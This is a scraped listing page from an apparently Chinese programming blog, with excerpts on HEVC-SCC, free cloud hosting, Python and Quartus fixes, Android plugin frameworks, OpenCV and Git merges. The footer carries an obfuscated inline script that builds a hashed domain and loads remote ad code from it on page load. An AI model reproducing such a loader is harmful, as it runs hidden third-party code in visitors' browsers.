		<h2 class="list__title post__title">
			<a href="/posts/7afa2fd033514bc69a69afe0dd419fe0/" rel="bookmark">
			【Codecs系列】HEVC-SCC编码技术汇总
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		DATE: 2020.7.11
【Codecs系列】HEVC-SCC（一）：核心技术介绍
【Codecs系列】HEVC-SCC（二）：IBC编码技术
【Codecs系列】HEVC-SCC（三）：基于hash search的IBC快速算法
【Codecs系列】HEVC-SCC（四）：SCC IBC句法
【Codecs系列】HEVC-SCC（五）：HM+SCM中IBC编码流程和实现分析
【Codecs系列】HEVC-SCC（六）：IBC优化相关专利分析
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/89e1133d886217a2c13afb086e7ad110/" rel="bookmark">
			免费的云产品
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		免费的云产品 云数据库 地址：https://planetscale.com/
使用：直接无脑操作，值得注意的是在选择CLI直接通过命令行来连接数据库时
mysql -h lqu8oy8shq8c.us-east-3.psdb.cloud -u 7f2u85345msy -p************ --ssl-mode=VERIFY_IDENTITY --ssl-ca=/etc/ssl/certs/ca-certificates.crt 其中--ssl-mode=VERIFY_IDENTITY --ssl-ca=/etc/ssl/certs/ca-certificates.crt在使用Windows操作时要删掉，这是给Linux用的
然后就能顺利连接
Vercel 地址：https://vercel.com
Vercel是一个开箱即用的网站托管平台，全球都有CDN节点，还是很快的（还可以自定义域名）
在上面可以用github登录，在授权之后该网站可以直接运行github仓库里面的代码
4everland 地址：https://www.4everland.org/
这个产品的作用在我们看来跟vercel很相似，用来部署静态资源（可以自定义域名）
它的功能和Vercel很相似，也有全球CDN加速，不过速度稍微慢一点
netlify 地址：https://www.netlify.com/
这个梗前面两款功能几乎是一样的，不过缺点就是项目部署的速度是在太慢了，七八分钟的时间，不过有个好处就是可以自动帮你把http变成https，不用去惨兮兮的申请一年的证书了
另外，有一款很不错的Hexo主题，文档如下
https://www.notion.so/Miracle-49659de5b1764e908c7496418f06277e
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/ac4a654f31e2facec9b6c209849736b0/" rel="bookmark">
			解决python命令行报错问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		解决Python报错Failed calling sys.__interactivehook__ 报错截图
可以看到主要的报错信息
File "D:\Python\Anaconda3\lib\site-packages\pyreadline\lineeditor\history.py", line 82, in read_history_file for line in open(filename, 'r'): UnicodeDecodeError: 'gbk' codec can't decode byte 0xaa in position 50: illegal multibyte sequence 找到这个history.py的文件的第82行，加上, encoding='utf-8'即可
保存再次运行就没问题了
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/7d99bb57503a979a4adbd3b15bbaf34e/" rel="bookmark">
			Quartus无法生成.V文件的问题
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		Quartus无法生成.V文件的问题
在创建元件时应该选择创建Verilog HDL 这样在元件的设置最后就会有.V文件生成选择
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/69da7833a8dd68ae736e493186655e89/" rel="bookmark">
			Android主流插件化
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		 前言:插件化技术发展到现在其实已经很成熟了，但是相应的问题，如果没有真正地去实践过，根本不了解其中有多少问题，会牵涉到多少技术细节，多少被外人膜拜的外表光鲜的技术大牛都被『插件化』这三个字折磨地死去活来，这对于 Android 整个生态的损害也让人无法忽视。
一.Android插件化的细节:
1.在 Android 里有一个比较好的一点是，作为 library 的时候，aar 里的引用依赖，在宿主 Application 里也有同样的引用依赖，并不会打包两份到宿主 Application 里；
2.模块之间的跳转，除了使用别名的方式，我能想到的还有另外一种方式，同样是通过 gradle 脚本，将跳转用到的类打成一个 jar ，作为一个 API 服务提供给其他模块作为编译期依赖（provided）引入；
3.各个 library 在 debug 的时候作为 apk ，要独立打包运行测试，这时就需要有一个启动 Activity ，而 library 是不需要的，我的想法是放置两个 AndroidManifest.xml ，使用 sourceSets 分别在 debug 和 release 的时候加载不同的 AndroidManifest.xml。
二.开源插件化框架(框架详解及优缺点对比图如下:):
目前成熟的开源框架分别有 1. 360插件开发之DroidPlugin ,360开源全面插件化框架RePlugin a.DroidPlugin是360手机助手在Android系统上实现了一种新的插件机制。它可以在无需安装、 修改的情况下运行APK文件,此机制对改进大型APP的架构，实现多团队协作开发具有一定好 处。
b.RePlugin 是一套完整的、稳定的、适合全面使用的，占坑类插件化方案，由360手机卫士的 RePlugin Team研发，也是业内首个提出”全面插件化“（全面特性、全面兼容、全面使用）的 方 案。
2.滴滴VirtualApk a.VirtualAPK是滴滴在2017年6月开源的一款插件化框架，支持Android四大组件，以及几乎所有的Android特性，通过Gradle来构建插件，集成与构建十分便捷，目前已经应用在 滴滴出行App上，兼容市面上几乎所有的Android设备。
3.爱奇艺插件化原理分析之 Neptune框架 a.Neptune是爱奇艺移动端研发的一套灵活，稳定，轻量级的插件化解决方案。经过不断的研 发，迭代和线上验证，目前已经完全适配了Android P，能够在数亿的设备上动态加载和运行插件APK，为爱奇艺众多的垂直业务团队提供了稳定的服务。
4.腾讯插件化框架 Shadow
a.Shadow是一个腾讯自主研发的Android插件框架，经过线上亿级用户量检验。Shadow不仅开 源分享了插件技术的关键代码，还完整的分享了上线部署所需要的所有设计。更是具有复用独 立安装App的源码、零反射无Hack实现插件技术、全动态插件框架、宿主增量极小、Kotlin支持等特点。
特性RePluginVirtualAPKQigsawShadow开源方奇虎360滴滴爱奇艺腾讯支持四大组件√√√√支持新增四大组件√√×√支持原生资源动态化√√√√Flutter代码动态化√√√√Flutter代码资源动态化××××Hook方式少多少无Android系统兼容2.3-9.04.03-9.04.0+4.0-12厂商系统兼容性低中中高多插件支持√√√×框架自身动态化×××√接入难度低中中高 
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/97a9d3200e49f5818f0ac4e80fecd940/" rel="bookmark">
			Opencv——minAreaRect()计算最小外界矩形
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		https://blog.csdn.net/qq_30974369/article/details/76405546
https://blog.csdn.net/qpswwww/article/details/44102039?spm=1001.2101.3001.6650.7&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7ERate-7-44102039-blog-96774375.pc_relevant_multi_platform_featuressortv2dupreplace&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7EOPENSEARCH%7ERate-7-44102039-blog-96774375.pc_relevant_multi_platform_featuressortv2dupreplace&amp;utm_relevant_index=8
给定一个凸多边形 P ， 面积最小的能装下 P （就外围而言）的矩形是怎样的呢？ 从技术上说， 给定一个方向， 能计算出 P 的端点并且构由此造出外接矩形。 但是我们需要测试每个情形来获得每个矩形来计算最小面积吗？ 谢天谢地， 我们不必那么干。
对于多边形 P 的一个外接矩形存在一条边与原多边形的边共线。
上述结论有力地限制了矩形的可能范围。 我们不仅不必去检测所有可能的方向， 而且只需要检测与多边形边数相等数量的矩形。
图示上述结论： 四条切线（红色）， 其中一条与多边形一条边重合， 确定了外接矩形（蓝色）
一个简单的算法是依次将每条边作为与矩形重合的边进行计算。 但是这种构造矩形的方法涉及到计算多边形每条边端点， 一个花费 O(n) 时间（因为有 n 条边）的计算。 整个算法将有二次时间复杂度。
一个更高效的算法已经发现。 利用旋转卡壳， 我们可以在常数时间内实时更新， 而不是重新计算端点。
实际上， 考虑一个凸多边形， 拥有两对和 x 和 y 方向上四个端点相切的切线。 四条线已经确定了一个多边形的外接矩形。 但是除非多边形有一条水平的或是垂直的边， 这个矩形的面积就不能算入最小面积中。
然而， 可以通过旋转线直到条件满足。 这个过程是下属算法的核心。 假设按照顺时针顺序输入一个凸多边形的n 个顶点。
计算全部四个多边形的端点， 称之为 xminP， xmaxP， yminP， ymaxP。
通过四个点构造 P 的四条切线。 他们确定了两个“卡壳”集合。
如果一条（或两条）线与一条边重合， 那么计算由四条线决定的矩形的面积， 并且保存为当前最小值。 否则将当前最小值定义为无穷大。
顺时针旋转线直到其中一条和多边形的一条边重合。
重复步骤4和步骤5， 直到线旋转过的角度大于90度。
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/97a9d3200e49f5818f0ac4e80fecd940/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/444839e43ec265e04a3cea81af50149d/" rel="bookmark">
			判断两个IP是否在同一网段
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		import org.apache.commons.compress.utils.Lists; import java.util.List; public class NetUtil { private static final String DEFALUT_SUBNET_MASK = "255.255.255.0"; public static void main(String[] args) { System.out.println(isSameNetWork("192.168.1.1", "192.166.2.1")); System.out.println(isSameNetWork("192.168.1.1", "192.168.3.3")); System.out.println(isSameNetWork("117.20.116.233", "117.20.116.40")); } public static boolean isSameNetWork(String ip, String compareIp){ List&lt;String&gt; ipList = calculate(ip, DEFALUT_SUBNET_MASK); List&lt;String&gt; sub = calculate(compareIp, DEFALUT_SUBNET_MASK); if(!ipList.get(0).equals(sub.get(0))){ return false; } return ipList.get(1).equals(sub.get(1)); } /** * 根据原始ip子网掩码通过亦或计算得到网段 * @param ip * @param subNetMask 子网掩码 * @return */ private static List&lt;String&gt; calculate(String ip, String subNetMask){ //ip String[] ipArray = ip.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/444839e43ec265e04a3cea81af50149d/">Read more…</a>
	</div>
</article><article class="list__item post">
	
	<header class="list__header">
		<h2 class="list__title post__title">
			<a href="/posts/4c139a8a80ba6f7adbf5f5600b3d2b8b/" rel="bookmark">
			使用分支——处理Git merge 冲突
			</a>
		</h2>
		
	</header>
	<div class="content list__excerpt post__content clearfix">
		使用分支——处理Git merge 冲突 版本控制系统就是负责管理来自于多个提交者（通常是开发者）之间的提交的。有时候多个开发者可能会编辑同一部分内容。一旦开发者A编辑了开发者B正在编辑的内容，冲突就会产生。为了降低冲突发生的概率，开发者们会在独立的分支内开展工作。git merge命令的主要职责就在于整合不同分支并且解决冲突。
理解merge冲突 合并和冲突是使用Git过程中的常见场景。在其他版本控制工具中冲突可能会非常浪费时间。Git让合并变得更加简单。大多数时候，Git会自行弄清楚如何自动的整合新变化。
冲突一般来自于两个不同的开发者改变了同一个文件中的同一行内容，或者一个开发者删除了另一个开发者正在修改的文件。在这类场景下，Git无法自动确定谁的改动是应该采纳的。冲突发生时只会影响到执行合并操作的开发者，而其他团队成员则不会受到任何影响。Git会对发生冲突的文件进行标记并停止合并进程。接下来就需要开发者自行进行冲突处理。
Merge 冲突的类型 进入冲突状态发生在合并过程中的两个时间点。一个是开始进行合并时，另一个是在合并过程中。接下来的内容分别关于如何解决这两种不同场景。
合并开始时的冲突 当工作目录下或者暂存区内的文件含有变更时，Git会中断合并操作。之所以Git会如此操作，是因为Git认为这些未提交的变更会被合并操作覆盖掉。这种情况发生时，并不是因为改变会与其他开发者的提交产生冲突，而是合并本身会与本地的修改产生冲突。此时需要使用git stash, git checkout,git commit或者git reset 命令使得本地仓库处于稳定状态。合并操作开始时的失败会在命令行提示如下错误信息：
error: Entry '&lt;fileName&gt;' not uptodate. Cannot merge. (Changes in working directory) 合并进行时的冲突
合并过程中发生的冲突意味着你的本地分支与进行合并的分支产生了冲突。也就是说你本地的代码与其他开发者的代码产生了冲突。Git会尽量合并不同分支的文件，但如果真正产生冲突仍然会将手动合并的任务交给你来处理。这种场景下Git会在命令行留下如下的错误信息：
error: Entry '&lt;fileName&gt;' would be overwritten by merge. Cannot merge. (Changes in staging area) 创造一个合并冲突 为了真正的了解合并冲突，下面的内容将会手动模拟创建一个冲突并且在稍后来查看和解决这个冲突。下面的代码需要您使用*nix系统的命令行Git工具，以便创建这个模拟冲突。
$ mkdir git-merge-test $ cd git-merge-test $ git init . $ echo "this is some content to mess with" &gt; merge.txt $ git add merge.
	</div>
	<div class="list__footer clearfix">
		<a class="list__footer-readmore btn" href="/posts/4c139a8a80ba6f7adbf5f5600b3d2b8b/">Read more…</a>
	</div>
</article>
</main>

<div class="pagination">
	<a class="pagination__item pagination__item--prev btn" href="/page/235/">«</a>
	<span class="pagination__item pagination__item--current">236/578</span>
	<a class="pagination__item pagination__item--next btn" href="/page/237/">»</a>
</div>

			</div>
			
		</div>
		<footer class="footer">
	<div class="container footer__container flex">
		
		<div class="footer__copyright">
			&copy; 2023 编程随想.
			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
		</div>
	</div>
</footer>

<script src="https://www.w3counter.com/tracker.js?id=151182"></script>
<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>


	</div>
<script async defer src="/js/menu.js"></script>
</body>
</html>